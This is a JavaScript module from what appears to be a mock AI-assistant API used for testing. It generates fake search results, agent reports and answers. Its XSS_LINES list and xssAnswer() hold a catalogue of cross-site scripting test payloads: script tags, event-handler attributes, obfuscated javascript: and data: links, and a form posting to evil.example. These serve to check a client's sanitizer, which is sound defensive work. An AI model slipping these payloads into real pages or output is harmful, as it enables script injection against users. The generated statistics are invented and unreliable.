// Content generators for the mock Claude API: directive parsing, plausible web search results,
// agent reports, lead answers and the special payloads ([[xss]], [[long]]).
// Everything is deterministic for a given seed so failures reproduce.

import { base64, isPlainObject, sha256Hex, slugify, titleCase, truncate } from './util.mjs';

// ---------------------------------------------------------------------------------------------
// Directives: [[name]] or [[name:arg]] anywhere in the latest user text.

const DIRECTIVE_RE = /\[\[\s*([a-z][a-z0-9_-]*)\s*(?::\s*([^\]]*?))?\s*\]\]/gi;

export function parseDirectives(text) {
  const list = [];
  for (const m of String(text ?? '').matchAll(DIRECTIVE_RE)) {
    list.push({ name: m[1].toLowerCase(), arg: m[2] === undefined ? '' : m[2].trim(), raw: m[0] });
  }
  const find = (name) => list.find((d) => d.name === name);
  return {
    list,
    names: list.map((d) => d.name),
    has: (name) => !!find(name),
    arg: (name) => find(name)?.arg ?? '',
    /** Integer argument clamped to [min, max], `fallback` when missing or not a number. */
    int(name, fallback, min = 1, max = 20) {
      const n = parseInt(find(name)?.arg ?? '', 10);
      return Number.isFinite(n) ? Math.min(max, Math.max(min, n)) : fallback;
    },
  };
}

export function stripDirectives(text) {
  return String(text ?? '').replace(DIRECTIVE_RE, ' ').replace(/[ \t]+/g, ' ').replace(/\s*\n\s*/g, '\n').trim();
}

// Directives the lead copies into every agent task, and those it copies into exactly one task.
export const WORKER_DIRECTIVES_ALL = ['slow', 'ratelimit', 'dropworkers', 'workerpause', 'xss', 'otpm'];
export const WORKER_DIRECTIVES_ONE = ['workerfail', 'workerrefuse'];

/** The directive tokens a lead should copy into agent task `index` of `count`. */
export function directivesForAgent(directives, index, count) {
  const out = [];
  for (const d of directives.list) {
    if (WORKER_DIRECTIVES_ALL.includes(d.name)) out.push(d.raw);
    else if (WORKER_DIRECTIVES_ONE.includes(d.name)) {
      if (index === count - 1) out.push(d.raw); // the last agent gets the single-agent directives
    } else if (d.name.startsWith('worker')) out.push(d.raw); // any other [[worker…]] directive
  }
  return [...new Set(out)];
}

// ---------------------------------------------------------------------------------------------
// Reading the request

const TURN_CONTEXT_RE = /<turn_context>[\s\S]*?<\/turn_context>/g;

/** Text of a user message without the <turn_context> block (tool_result content is ignored). */
export function userTextOf(message) {
  if (!message || message.role !== 'user') return '';
  const parts = typeof message.content === 'string'
    ? [message.content]
    : (Array.isArray(message.content) ? message.content : []).filter((b) => b?.type === 'text').map((b) => b.text);
  return parts
    .map((t) => String(t ?? '').replace(TURN_CONTEXT_RE, ''))
    .filter((t) => !/^\s*<turn_context>/.test(t))
    .join('\n')
    .trim();
}

/** Parsed fields of the <turn_context> block in a user message (all optional). */
export function turnContextOf(message) {
  const blocks = typeof message?.content === 'string'
    ? [message.content]
    : (Array.isArray(message?.content) ? message.content : []).filter((b) => b?.type === 'text').map((b) => b.text);
  const ctx = blocks.map((t) => String(t).match(/<turn_context>([\s\S]*?)<\/turn_context>/)?.[1]).find(Boolean) || '';
  const line = (label) => ctx.match(new RegExp(`^\\s*${label}:\\s*(.+)$`, 'mi'))?.[1]?.trim() || '';
  return {
    present: !!ctx,
    name: line('Address the owner as') || 'sir',
    localTime: line('Local time'),
    location: line('Owner location'),
    mode: (line('Mode').split(/\s+/)[0] || '').toLowerCase(),
  };
}

// ---------------------------------------------------------------------------------------------
// Attachments (SPEC §15.1): image and PDF document blocks in the owner's message

/** The image and document blocks of a user message, in order. */
export function attachmentsOf(message) {
  if (!message || message.role !== 'user' || !Array.isArray(message.content)) return [];
  return message.content.filter((b) => b && (b.type === 'image' || b.type === 'document'));
}

function imageSize(buf, mediaType) {
  try {
    if (mediaType === 'image/png' && buf.length >= 24) return { width: buf.readUInt32BE(16), height: buf.readUInt32BE(20) };
    if (mediaType === 'image/gif' && buf.length >= 10) return { width: buf.readUInt16LE(6), height: buf.readUInt16LE(8) };
    if (mediaType === 'image/webp' && buf.length >= 30) {
      const chunk = buf.subarray(12, 16).toString('latin1');
      if (chunk === 'VP8X') return { width: 1 + buf.readUIntLE(24, 3), height: 1 + buf.readUIntLE(27, 3) };
      if (chunk === 'VP8 ') return { width: buf.readUInt16LE(26) & 0x3fff, height: buf.readUInt16LE(28) & 0x3fff };
      if (chunk === 'VP8L') {
        const bits = buf.readUInt32LE(21);
        return { width: (bits & 0x3fff) + 1, height: ((bits >> 14) & 0x3fff) + 1 };
      }
    }
    if (mediaType === 'image/jpeg') {
      let i = 2;
      while (i + 9 < buf.length) {
        if (buf[i] !== 0xff) {
          i++;
          continue;
        }
        const marker = buf[i + 1];
        if (marker >= 0xc0 && marker <= 0xcf && marker !== 0xc4 && marker !== 0xc8 && marker !== 0xcc) {
          return { width: buf.readUInt16BE(i + 7), height: buf.readUInt16BE(i + 5) };
        }
        if (marker === 0xd8 || marker === 0x01 || (marker >= 0xd0 && marker <= 0xd7)) {
          i += 2;
          continue;
        }
        i += 2 + buf.readUInt16BE(i + 2);
      }
    }
  } catch {
    /* truncated or unusual file */
  }
  return null;
}

/**
 * What the mock "sees" in an attachment block: { kind: 'image'|'pdf'|'document', label, width?,
 * height?, pages?, title? } (dimensions from the image header, pages counted in the PDF).
 */
export function describeAttachmentBlock(block) {
  const src = block?.source || {};
  if (block?.type === 'image') {
    const mediaType = src.type === 'base64' ? src.media_type : '';
    const size = src.type === 'base64' ? imageSize(Buffer.from(String(src.data || ''), 'base64'), mediaType) : null;
    const format = { 'image/jpeg': 'JPEG', 'image/png': 'PNG', 'image/gif': 'GIF', 'image/webp': 'WebP' }[mediaType] || 'linked';
    return { kind: 'image', format, width: size?.width || null, height: size?.height || null };
  }
  const title = typeof block?.title === 'string' && block.title.trim() ? block.title.trim() : '';
  if (src.type === 'base64' && src.media_type === 'application/pdf') {
    const text = Buffer.from(String(src.data || ''), 'base64').toString('latin1');
    const pages = (text.match(/\/Type\s*\/Page(?![s\w])/g) || []).length || 1;
    return { kind: 'pdf', title, pages };
  }
  return { kind: 'document', title, pages: null };
}

const plural = (n, one, many = `${one}s`) => `${n} ${n === 1 ? one : many}`;

function attachmentPhrase(files) {
  const images = files.filter((f) => f.kind === 'image').length;
  const docs = files.length - images;
  const parts = [];
  if (images) parts.push(images === 1 ? 'the image' : `the ${images} images`);
  if (docs) parts.push(docs === 1 ? 'the PDF' : `the ${docs} PDFs`);
  return parts.join(' and ');
}

function attachmentLine(f, i) {
  if (f.kind === 'image') {
    const dims = f.width && f.height ? `${f.width} × ${f.height} pixels` : 'size unknown';
    return `- **Image ${i + 1}:** a ${f.format} picture, ${dims}, clear enough to read.`;
  }
  const name = f.title || `Document ${i + 1}`;
  return `- **${name}:** a PDF${f.pages ? ` of ${plural(f.pages, 'page')}` : ''}; I have read it in full.`;
}

/** A short "I can see the image…" / "I've read the PDF…" answer about the files in the owner's message. */
export function attachmentAnswer({ prompt, ctx, blocks }) {
  const files = blocks.map(describeAttachmentBlock);
  const phrase = attachmentPhrase(files);
  const onlyDocs = files.every((f) => f.kind !== 'image');
  const opener = onlyDocs
    ? `I've read ${phrase} you shared, ${ctx.name}${files.length === 1 && files[0].title ? `: “${files[0].title}”` : ''}.`
    : `I can see ${phrase} you shared, ${ctx.name}.`;
  const question = stripDirectives(prompt);
  const asked = question && !/^please look at the attached file\(s\)\.?$/i.test(question);
  return [
    opener,
    '',
    ...files.map(attachmentLine),
    '',
    asked
      ? `On your question, “${truncate(question, 120)}”: the details above are what I can confirm from the files; ask me to dig into any of them.`
      : `Tell me what you would like to know, and I can describe, summarise or research anything in ${files.length === 1 ? 'it' : 'them'}.`,
  ].join('\n');
}

/** One sentence the mock lead adds to agent tasks, since agents cannot see attachments. */
export function attachmentTaskNote(blocks) {
  const files = blocks.map(describeAttachmentBlock);
  if (!files.length) return '';
  const desc = files
    .map((f) => (f.kind === 'image' ? `a ${f.format} photo${f.width ? ` (${f.width}×${f.height})` : ''}` : `a PDF${f.title ? ` titled “${f.title}”` : ''}${f.pages ? ` (${plural(f.pages, 'page')})` : ''}`))
    .join(' and ');
  return `Context: the owner shared ${desc}; the details that matter are described in this task.`;
}

/** Fields of a worker assignment message built by the engine (SPEC §8.5). */
export function parseAssignment(text) {
  const t = String(text ?? '');
  const mission = t.match(/<mission>\s*Overall mission:\s*([\s\S]*?)\s*Your teammates/i)?.[1]?.trim()
    || t.match(/<mission>([\s\S]*?)<\/mission>/i)?.[1]?.trim() || '';
  const assignment = t.match(/<assignment>([\s\S]*?)<\/assignment>/i)?.[1] ?? '';
  const role = assignment.match(/^\s*Role:\s*(.+)$/mi)?.[1]?.trim() || '';
  const task = assignment.match(/^\s*Task:\s*([\s\S]*?)(?:\n\s*Web access:|$)/i)?.[1]?.trim() || '';
  const localTime = t.match(/<context>[\s\S]*?Local time:\s*([^;<\n]+)/i)?.[1]?.trim() || '';
  return { mission, role, task, assignment: assignment.trim(), localTime, structured: !!assignment };
}

/** The research topic from a task the mock lead wrote ("Research X with a focus on Y."), or a fallback. */
export function topicOfTask(task) {
  const clean = stripDirectives(task);
  const m = clean.match(/Research (.+?) with a focus on (.+?)\./i);
  if (m) return { topic: m[1].trim(), angle: m[2].trim() };
  const words = clean.split(/\s+/).filter(Boolean);
  return { topic: words.slice(0, 8).join(' ') || 'the assignment', angle: words.slice(8, 14).join(' ') || 'the key facts' };
}

/** A short topic phrase from the owner's prompt. */
export function topicOfPrompt(prompt) {
  let t = stripDirectives(prompt).replace(/\s+/g, ' ').trim();
  t = t.replace(/^(please\s+)?(can you\s+|could you\s+)?(research|compare|find out|investigate|look into|tell me about|explain)\s+/i, '');
  t = t.replace(/[?.!]+$/, '');
  return truncate(t || "the owner's request", 80);
}

// ---------------------------------------------------------------------------------------------
// Web search results and citations

const SOURCES = [
  (s, a, q) => ({ url: `https://www.example.com/${a}/${s}`, title: `${titleCase(q)}: what changed in 2026 | Example News` }),
  (s, a, q) => ({ url: `https://guides.example.org/${s}/${a}-guide`, title: `The complete guide to ${q} (2026 update) | Example Guides` }),
  (s, a, q) => ({ url: `https://reviews.example.net/${s}-${a}-compared`, title: `${titleCase(q)} compared: data, prices and verdicts | Example Reviews` }),
  (s, a, q) => ({ url: `https://stats.example.org/reports/${s}-${a}`, title: `Official statistics: ${q} | Example Statistics Office` }),
  (s, a, q) => ({ url: `https://docs.example.com/${a}/${s}/faq`, title: `${titleCase(q)}: frequently asked questions | Example Docs` }),
  (s, a, q) => ({ url: `https://www.example.com/analysis/${s}-${a}-outlook`, title: `Analysis: the outlook for ${q} | Example Analysis` }),
];
const PAGE_AGES = ['2 days ago', '5 days ago', '1 week ago', '2 weeks ago', 'November 12, 2026', 'October 30, 2026', 'September 18, 2026'];

/**
 * 3–5 plausible results for `query`. `scope` (e.g. an agent role) keeps URLs distinct between
 * agents. Returns [{ result, snippet }] where result is a web_search_result block.
 */
export function searchResults(query, rng, scope = 'web', count = rng.int(3, 5)) {
  const s = slugify(query, 40);
  const a = slugify(scope, 24);
  const q = shortPhrase(query, 48);
  const order = rng.shuffle(SOURCES).slice(0, Math.min(5, Math.max(3, count)));
  return order.map((make, i) => {
    const { url, title } = make(s, a, q);
    const snippet = `${titleCase(query)}: ${SNIPPETS[(i + rng.int(0, SNIPPETS.length - 1)) % SNIPPETS.length]}`;
    return {
      snippet,
      result: {
        type: 'web_search_result',
        url,
        title,
        encrypted_content: base64(`mock-search-result|${url}|${snippet}`),
        page_age: rng.pick(PAGE_AGES),
      },
    };
  });
}
const SNIPPETS = [
  'independent testing in 2026 shows clear differences between the leading options.',
  'prices have fallen roughly 8% year over year, while availability has improved.',
  'experts recommend comparing total cost over five years rather than the sticker price.',
  'official figures were revised in October 2026 after a methodology change.',
  'owner surveys point to reliability and support as the most common pain points.',
  'new regulations taking effect in 2027 are expected to reshape the market.',
];

export function citationFor({ result, snippet }) {
  return {
    type: 'web_search_result_location',
    url: result.url,
    title: result.title,
    cited_text: truncate(snippet, 150),
    encrypted_index: Buffer.from(sha256Hex(`mock-index|${result.url}|${snippet}`).slice(0, 36), 'hex').toString('base64'),
  };
}

/** Cut text at a word boundary to at most `max` characters (no ellipsis; used inside titles). */
export function shortPhrase(text, max) {
  const s = String(text ?? '').replace(/\s+/g, ' ').trim();
  if (s.length <= max) return s;
  const cut = s.slice(0, max + 1);
  const space = cut.lastIndexOf(' ');
  return (space > max * 0.5 ? cut.slice(0, space) : s.slice(0, max)).trim();
}

/** A web_fetch_tool_result for one search hit. */
export function fetchResultBlock(toolUseId, hit, now) {
  return {
    type: 'web_fetch_tool_result',
    tool_use_id: toolUseId,
    content: {
      type: 'web_fetch_result',
      url: hit.result.url,
      retrieved_at: now.toISOString(),
      content: {
        type: 'document',
        source: {
          type: 'text',
          media_type: 'text/plain',
          data: `${hit.result.title}\n\n${hit.snippet}\n\nThis page (a mock document served by the Jarvis test API) summarizes recent data, expert commentary and practical advice. Figures are illustrative.`,
        },
        title: hit.result.title,
        citations: null,
      },
    },
  };
}

/**
 * Turn segments [{ text, cite? }] into text blocks the way the API returns cited answers: runs of
 * uncited text are merged into one block; each cited span is its own block with `citations`.
 */
export function textBlocks(segments) {
  const blocks = [];
  for (const seg of segments) {
    if (!seg.text) continue;
    const prev = blocks[blocks.length - 1];
    if (seg.cite) blocks.push({ type: 'text', text: seg.text, citations: [citationFor(seg.cite)] });
    else if (prev && !prev.citations) prev.text += seg.text;
    else blocks.push({ type: 'text', text: seg.text, citations: null });
  }
  // The API never sends whitespace-only text blocks: fold any into the previous block (or the next
  // one when it is first), so the joined text stays identical.
  const out = [];
  let carry = '';
  for (const b of blocks) {
    if (b.text.trim()) {
      if (carry) b.text = carry + b.text;
      carry = '';
      out.push(b);
    } else if (out.length) {
      out[out.length - 1].text += b.text;
    } else {
      carry += b.text;
    }
  }
  return out;
}

// ---------------------------------------------------------------------------------------------
// Worker reports

const FINDINGS = [
  (t, a) => `Recent coverage of ${t} identifies ${a} as the deciding factor for most people in 2026.`,
  (t) => `Independent testing shows the leading options for ${t} are within about 10% of each other on the core measures.`,
  (t) => `Prices related to ${t} have fallen roughly 8% over the past year, while availability has improved.`,
  (t) => `Official figures on ${t} were revised in October 2026 after a methodology change, so older comparisons may be misleading.`,
  (t) => `Owner surveys about ${t} point to reliability and after-sales support as the most common complaints.`,
  (t) => `Upcoming rules taking effect in 2027 are expected to change the economics of ${t}.`,
];

export const XSS_LINES = [
  '<script>alert("xss-script")</script>',
  '<img src=x onerror="alert(\'xss-img\')">',
  '<svg onload="alert(\'xss-svg\')"><circle r="5"/></svg>',
  '<iframe src="javascript:alert(\'xss-iframe\')"></iframe>',
  '<a href="javascript:alert(\'xss-raw-anchor\')">raw anchor tag</a>',
  '<a href="https://www.example.com/" onclick="alert(\'xss-onclick\')">anchor with onclick</a>',
  '[javascript link](javascript:alert(\'xss-md-link\'))',
  '[mixed-case scheme](JaVaScRiPt:alert(\'xss-case\'))',
  '[spaced scheme](  javascript:alert(\'xss-spaced\'))',
  '[entity scheme](java&#x73;cript:alert(\'xss-entity\'))',
  '[data link](data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzLWRhdGEnKTwvc2NyaXB0Pg==)',
  '[vbscript link](vbscript:msgbox("xss-vbs"))',
  '![remote image](https://www.example.com/tracker.png)',
  '![data image](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+)',
  '&lt;script&gt;alert("xss-entities")&lt;/script&gt; and &#60;img src=x onerror=alert(1)&#62;',
  '<style>body { display: none !important; }</style>',
  '<form action="https://evil.example/collect"><input name="q"><button>Submit</button></form>',
  '<object data="javascript:alert(\'xss-object\')"></object><embed src="javascript:alert(\'xss-embed\')">',
  '<details open ontoggle="alert(\'xss-toggle\')"><summary>details</summary></details>',
  '[nested [brackets] link](https://www.example.com/nested "title with \\"quotes\\"")',
  '<https://www.example.com/safe-autolink> and a mail link [write to us](mailto:owner@example.com)',
  '`<b>inline code is text</b>`',
];

/**
 * Agent report segments for a worker. `hits` are search hits (first ones are cited), `fetched`
 * the hit read with web_fetch (or null). Returns [{ text, cite? }].
 */
export function workerReportSegments({ topic, angle, role, hits, fetched, rng, xss, web }) {
  const segs = [];
  const add = (text, cite) => segs.push({ text, cite });
  add('## Key findings\n\n');
  const findings = rng.shuffle(FINDINGS).slice(0, 3);
  findings.forEach((f, i) => {
    const hit = hits[i % Math.max(1, hits.length)];
    add('- ');
    if (hit) {
      add(f(topic, angle), hit);
      add(` ([${hit.result.title.split(' | ')[0]}](${hit.result.url}))\n`);
    } else {
      add(`${f(topic, angle)}\n`);
    }
  });
  if (!web) add('- No web access for this assignment: findings come from general knowledge and may be out of date.\n');
  add('\n## Details\n\n');
  add(`As the team's ${role || 'researcher'}, I focused on ${angle}. `);
  if (fetched) {
    add('The most authoritative page I read in full was ');
    add(`[${fetched.result.title.split(' | ')[0]}](${fetched.result.url})`);
    add(', which ');
    add('lays out the current figures and the reasoning behind them', fetched);
    add('.\n\n');
  } else {
    add('Search snippets were consistent with each other, so I did not need to read further pages.\n\n');
  }
  add('| Measure | Finding | Trend |\n|:--|:--|:-:|\n');
  add(`| Cost | Roughly 8% lower than last year | ↓ |\n| Availability | Improving | ↑ |\n| Satisfaction | Mixed on support | → |\n`);
  if (xss) {
    add('\n## Raw notes (untrusted page content)\n\n');
    for (const line of XSS_LINES) add(`${line}\n\n`);
  }
  add('\n## Confidence and gaps\n\n');
  add(`- Confidence: ${rng.pick(['medium', 'medium-high', 'high'])}. ${hits.length || 'No'} sources reviewed${hits.length ? '; they agree on the main points' : ''}.\n`);
  add(`- Gap: I could not verify ${rng.pick(['regional differences', 'the very latest prices', 'long-term reliability data', 'figures for 2027'])}.\n`);
  return segs;
}

// ---------------------------------------------------------------------------------------------
// Lead answers

const CAPITALS = {
  france: 'Paris', germany: 'Berlin', italy: 'Rome', spain: 'Madrid', japan: 'Tokyo', portugal: 'Lisbon',
  canada: 'Ottawa', australia: 'Canberra', 'united kingdom': 'London', britain: 'London', england: 'London',
  netherlands: 'Amsterdam', norway: 'Oslo', sweden: 'Stockholm', ireland: 'Dublin', egypt: 'Cairo',
};

export function defaultAnswer(prompt, ctx) {
  const clean = stripDirectives(prompt);
  const lower = clean.toLowerCase();
  const country = Object.keys(CAPITALS).find((c) => lower.includes(c));
  if (country && (lower.includes('capital') || /^(and\s+)?(what|how)\s+about\b/.test(lower))) {
    const name = titleCase(country);
    const city = CAPITALS[country];
    return [
      `The capital of ${name} is ${city}.`,
      '',
      `**${city}** is ${name}'s seat of government and its largest cultural hub${country === 'france' ? ', home to the Louvre, the Eiffel Tower and about 2.1 million people in the city proper' : ''}.`,
      '',
      `Would you like a quick travel brief for ${city}, ${ctx.name}?`,
    ].join('\n');
  }
  const topic = topicOfPrompt(clean);
  return [
    `Here is a short answer about ${topic}, ${ctx.name}: the essentials are below, and I can dig deeper with a web search or a full agent team if you like.`,
    '',
    `- **What it is:** ${titleCase(topic)} is best understood by starting with the basics and the main trade-offs.`,
    '- **What matters most:** cost, reliability and how well it fits your situation.',
    '- **Next step:** tell me your constraints and I will tailor the recommendation.',
  ].join('\n');
}

export function longAnswer(prompt, ctx) {
  const topic = topicOfPrompt(prompt);
  return `This is a detailed guide to ${topic}, covering the key numbers, the steps to take and the trade-offs worth knowing.

## Overview

${titleCase(topic)} rewards a little preparation. This answer uses **bold**, *italic*, ~~strikethrough~~, \`inline code\` and a [reference link](https://www.example.com/guide "Example guide") so every formatting path is exercised.

### Key numbers

| Option | Price | Range | Warranty | Rating | Notes |
|:--|--:|:-:|:-:|--:|:--|
| Alpha | $42,000 | 480 km | 8 years | 4.6 | Best all-rounder for most households |
| Bravo | $38,500 | 410 km | 5 years | 4.2 | Cheapest to run, slower charging |
| Charlie | $55,900 | 610 km | 10 years | 4.8 | Premium choice with the longest range |
| Delta | $47,250 | 520 km | 8 years | 4.4 | Strong resale value, long waiting list |

### Step by step

1. Decide what you actually need, ${ctx.name}: daily distance, budget and must-have features.
2. Shortlist three options and compare the total cost over five years.
   - Include insurance, energy and maintenance.
   - Check incentives available where you live.
3. Test the finalists in real conditions before committing.

### Checklist

- [x] Set a budget
- [x] Shortlist the options
- [ ] Book test drives
- [ ] Negotiate the final price

> Tip: the cheapest sticker price is rarely the cheapest option over five years.

\`\`\`js
// Five-year cost estimate
function fiveYearCost({ price, energyPerYear, maintenancePerYear, resale }) {
  return price + 5 * (energyPerYear + maintenancePerYear) - resale;
}
console.log(fiveYearCost({ price: 42000, energyPerYear: 900, maintenancePerYear: 400, resale: 21000 }));
\`\`\`

---

#### Edge cases for narrow screens

A very long link: https://www.example.com/a/really/long/path/that/keeps/going/and/going/without/any/natural/breaks/to/test/wrapping/on/narrow/phone/screens/0123456789abcdefghijklmnopqrstuvwxyz

An unbreakable word: Pneumonoultramicroscopicsilicovolcanoconiosis-and-then-some-more-characters-without-spaces-0123456789

#### Sources

- [Example guide](https://www.example.com/guide)
- [Example statistics](https://stats.example.org/reports/overview)
- <https://reviews.example.net/compared>`;
}

export function xssAnswer() {
  return [
    'Here are the test strings you asked for; they should all appear as harmless text.',
    '',
    ...XSS_LINES.flatMap((l) => [l, '']),
    '```html',
    '<script>alert("xss-in-code-block")</script>',
    '```',
  ].join('\n');
}

/** Parse the engine's mission tool_result text into agent reports (SPEC §8.4). */
export function parseAgentReports(content) {
  const text = typeof content === 'string'
    ? content
    : (Array.isArray(content) ? content : []).filter((b) => b?.type === 'text').map((b) => b.text).join('\n');
  const reports = [];
  // Attributes are required: the preamble mentions a bare <agent_report> tag (SPEC §8.4).
  for (const m of text.matchAll(/<agent_report\s+([^>]*?)>([\s\S]*?)<\/agent_report>/g)) {
    const attr = (name) => m[1].match(new RegExp(`${name}="([^"]*)"`))?.[1] || '';
    const body = m[2];
    const sources = [];
    for (const s of body.matchAll(/^\s*-\s+(.+?)\s+[—–-]\s+(https?:\/\/\S+)\s*$/gm)) sources.push({ title: s[1].trim(), url: s[2].trim() });
    for (const s of body.matchAll(/\[([^\]\n]+)\]\((https?:\/\/[^)\s]+)(?:\s+"[^"]*")?\)/g)) {
      if (!sources.some((x) => x.url === s[2])) sources.push({ title: s[1].trim(), url: s[2] });
    }
    const finding = body.match(/^\s*-\s+(.+)$/m)?.[1] || '';
    reports.push({ codename: attr('codename'), role: attr('role'), status: attr('status') || 'done', body, sources, finding });
  }
  return { text, reports };
}

function plainFinding(s) {
  const t = truncate(String(s).replace(/\(\[[^\]]*\]\([^)]*\)\)/g, '').replace(/\[([^\]]*)\]\([^)]*\)/g, '$1').replace(/[*_`#>]/g, '').trim(), 170);
  return t && !/[.!?…]$/.test(t) ? `${t}.` : t;
}

/** The lead's final synthesis over all agent reports of the turn. */
export function synthesisAnswer({ prompt, ctx, reports }) {
  const topic = topicOfPrompt(prompt);
  const done = reports.filter((r) => r.status === 'done');
  const failed = reports.filter((r) => r.status !== 'done');
  const names = reports.map((r) => r.codename).filter(Boolean);
  const lines = [];
  lines.push(
    reports.length
      ? `Your team of ${reports.length} agents has reported back on ${topic}: ${done.length} completed their assignments${failed.length ? ` and ${failed.length} could not finish` : ''}, and their findings point the same way.`
      : `I could not get agent reports this time, so here is what I can say about ${topic} directly.`,
  );
  lines.push('');
  if (names.length) {
    lines.push(`## What the team found`, '');
    for (const r of reports) {
      const src = r.sources[0];
      if (r.status === 'done') {
        lines.push(`- **${r.codename}** (${r.role || 'agent'}): ${plainFinding(r.finding) || 'completed the assignment.'}${src ? ` See [${src.title.split(' | ')[0]}](${src.url}).` : ''}`);
      } else {
        lines.push(`- **${r.codename}** (${r.role || 'agent'}) could not finish (${r.status}), so that angle is thinner.`);
      }
    }
    lines.push('');
  }
  lines.push('## What this means for you', '');
  lines.push(`The agents agree that ${topic} comes down to cost over time, reliability and fit, ${ctx.name}. Where sources disagreed, I have favoured the most recent official figures.`);
  const sources = [];
  for (const r of reports) for (const s of r.sources) if (!sources.some((x) => x.url === s.url)) sources.push(s);
  if (sources.length) {
    lines.push('', '## Sources', '');
    for (const s of sources.slice(0, 12)) lines.push(`- [${s.title.split(' | ')[0]}](${s.url})`);
  }
  return lines.join('\n');
}

/** Plain text of a tool_result `content` (string or list of text blocks). */
export function toolResultText(content) {
  if (typeof content === 'string') return content;
  if (!Array.isArray(content)) return '';
  return content.map((b) => (isPlainObject(b) && typeof b.text === 'string' ? b.text : '')).join('\n');
}

// ---------------------------------------------------------------------------------------------
// Structured outputs: a value that satisfies a (validated) JSON schema subset.

const FOLLOWUP_QUESTIONS = [
  'What are the main trade-offs I should weigh?',
  'How has this changed over the past year?',
  'What would you recommend for my situation?',
  'Which sources are the most reliable here?',
];
const STRING_FORMATS = {
  'date-time': () => '2026-11-19T16:35:00Z',
  date: () => '2026-11-19',
  time: () => '16:35:00',
  duration: () => 'P1D',
  email: () => 'owner@example.com',
  hostname: () => 'www.example.com',
  uri: () => 'https://www.example.com/',
  ipv4: () => '192.0.2.1',
  ipv6: () => '2001:db8::1',
  uuid: () => '123e4567-e89b-42d3-a456-426614174000',
};

/** Deterministic JSON value for `schema` (strings inside arrays become follow-up questions). */
export function valueFromSchema(schema, root = schema, hint = '', depth = 0) {
  if (!isPlainObject(schema) || depth > 12) return null;
  if (schema.const !== undefined) return schema.const;
  if (Array.isArray(schema.enum) && schema.enum.length) return schema.enum[0];
  if (typeof schema.$ref === 'string') {
    const name = schema.$ref.replace(/^#\/\$defs\//, '');
    return valueFromSchema(root.$defs?.[name], root, hint, depth + 1);
  }
  if (Array.isArray(schema.anyOf) && schema.anyOf.length) return valueFromSchema(schema.anyOf[0], root, hint, depth + 1);
  if (Array.isArray(schema.allOf) && schema.allOf.length) {
    return schema.allOf.reduce((acc, s) => {
      const v = valueFromSchema(s, root, hint, depth + 1);
      return isPlainObject(acc) && isPlainObject(v) ? { ...acc, ...v } : v ?? acc;
    }, undefined);
  }
  const type = Array.isArray(schema.type) ? schema.type.find((t) => t !== 'null') ?? 'null' : schema.type;
  switch (type) {
    case 'object': {
      const out = {};
      for (const [key, sub] of Object.entries(schema.properties || {})) out[key] = valueFromSchema(sub, root, key, depth + 1);
      return out;
    }
    case 'array': {
      const items = schema.items || { type: 'string' };
      const n = 3;
      return Array.from({ length: n }, (_, i) => {
        if (items.type === 'string' && !items.enum && !items.format) return FOLLOWUP_QUESTIONS[i % FOLLOWUP_QUESTIONS.length];
        return valueFromSchema(items, root, hint, depth + 1);
      });
    }
    case 'string':
      if (schema.format && STRING_FORMATS[schema.format]) return STRING_FORMATS[schema.format]();
      return /question|follow|suggest/i.test(hint) ? FOLLOWUP_QUESTIONS[0] : `Example ${hint || 'value'}`;
    case 'integer':
      return 1;
    case 'number':
      return 1.5;
    case 'boolean':
      return true;
    default:
      return null;
  }
}
